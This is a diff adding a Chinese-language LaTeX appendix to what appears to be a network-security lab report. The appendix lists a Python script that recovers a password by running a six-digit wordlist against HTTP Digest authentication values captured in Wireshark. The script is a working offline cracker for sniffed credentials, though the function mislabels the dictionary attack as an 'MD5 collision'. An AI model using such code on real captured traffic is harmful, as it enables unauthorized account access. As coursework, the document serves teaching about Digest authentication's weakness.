@@ -1,1 +1,74 @@
 % 后续在此填写或引入本实验的关键代码。
+\appendix
+
+\section{HTTP Digest 认证离线验证程序}
+\label{appendix:digest_crack}
+
+本程序根据 Wireshark 捕获到的 HTTP Digest 认证参数，
+遍历六位数字密码本中的候选口令，并重新计算认证摘要。
+当计算得到的摘要与捕获到的 \texttt{response} 一致时，
+即可确定对应的候选口令。
+
+\begin{lstlisting}[language=Python, caption={HTTP Digest 认证离线验证程序}, label={lst:digest_crack}]
+import hashlib
+
+
+# Wireshark 中提取的 Digest 参数
+username = "wjy"
+realm = "ARP-LAB"
+method = "GET"
+uri = "/"
+
+nonce = "skPh9mpcBgA=03449b152e612b90bcaa85e20ec0a1cf84b24071"
+nc = "00000001"
+cnonce = "14f4b7e2d69aada7"
+qop = "auth"
+
+response = "1597a1728dc072e7120b90fcf05ba80d"
+
+
+# 计算 MD5
+def compute_md5_hash(text):
+    return hashlib.md5(text.encode("utf-8")).hexdigest()
+
+
+# 定义 MD5 碰撞函数
+def MD5Collision(response, dictfilepath):
+
+    # 打开字典文件，读取所有口令
+    with open(dictfilepath, "r") as file:
+        passwords = file.readlines()
+
+    # 计算 MD5 摘要，与 response 进行碰撞
+    for password in passwords:
+        password = password.strip()
+
+        # 构建 A1 和 A2
+        textpart_A1 = f"{username}:{realm}:{password}"
+        textpart_A2 = f"{method}:{uri}"
+
+        A1_MD5 = compute_md5_hash(textpart_A1)
+        A2_MD5 = compute_md5_hash(textpart_A2)
+
+        # 构建最终 Digest 输入
+        textpart = (
+            f"{A1_MD5}:{nonce}:{nc}:{cnonce}:{qop}:{A2_MD5}"
+        )
+
+        # 计算密码的 MD5 摘要
+        digest = hashlib.md5(
+            textpart.encode("utf-8")
+        ).hexdigest()
+
+        # 检查摘要是否与捕获到的 response 匹配
+        if digest == response:
+            print(f"口令正确 : {password}")
+            return password
+
+    print("Password not found in dictionary.")
+    return None
+
+
+# 使用六位数字密码本
+MD5Collision(response, "Password.txt")
+\end{lstlisting}
